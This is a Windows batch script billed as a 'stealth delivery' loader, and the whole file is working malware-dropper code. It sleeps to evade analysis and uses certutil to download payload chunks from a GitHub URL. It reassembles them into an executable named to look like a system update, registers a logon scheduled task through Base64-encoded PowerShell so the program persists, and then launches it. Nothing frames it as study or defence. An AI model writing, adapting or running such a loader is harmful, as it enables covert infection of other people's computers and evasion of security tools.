@echo off
:: ==============================================================================
:: GHOST LOADER v8.0 - MAXIMUM STEALTH DELIVERY
:: ==============================================================================
:: LOLBAS + Encoded PowerShell + Obfuscation
:: ==============================================================================

set "u=https://raw.githubusercontent.com/sophieduval/der/main"
set "d=%LOCALAPPDATA%\SystemUpdate"
set "n=SystemUpdate_v80.exe"
set "t=%d%\%n%"
set "p=blob_"
set "e=.dat"

:: Anti-Analysis Delay (10 seconds)
ping -n 11 127.0.0.1 >nul

if not exist "%d%" md "%d%"
cd /d "%d%"

:: LOLBAS Download: certutil instead of PowerShell
for /l %%i in (0,1,10) do (
    set "x=%%i"
    if %%i LSS 10 set "x=0%%i"
    set "f=%p%!x!%e%"
    if not exist "!f!" (
        certutil -urlcache -split -f "%u%/!f!" "!f!" >nul 2>&1
    )
)

:: Reassemble
copy /b %p%00%e%+%p%01%e%+%p%02%e%+%p%03%e%+%p%04%e%+%p%05%e%+%p%06%e%+%p%07%e%+%p%08%e%+%p%09%e%+%p%10%e% "%n%" >nul

:: Encoded Persistence (Base64 PowerShell)
set "c=$a=New-ScheduledTaskAction -Execute '%t%';$t=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName 'SystemUpdateCheck' -Action $a -Trigger $t -Force"
for /f "delims=" %%b in ('powershell -Command "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('%c%'))"') do set "b64=%%b"
powershell -EncodedCommand %b64% >nul 2>&1

:: Execute
start "" "%n%"

exit
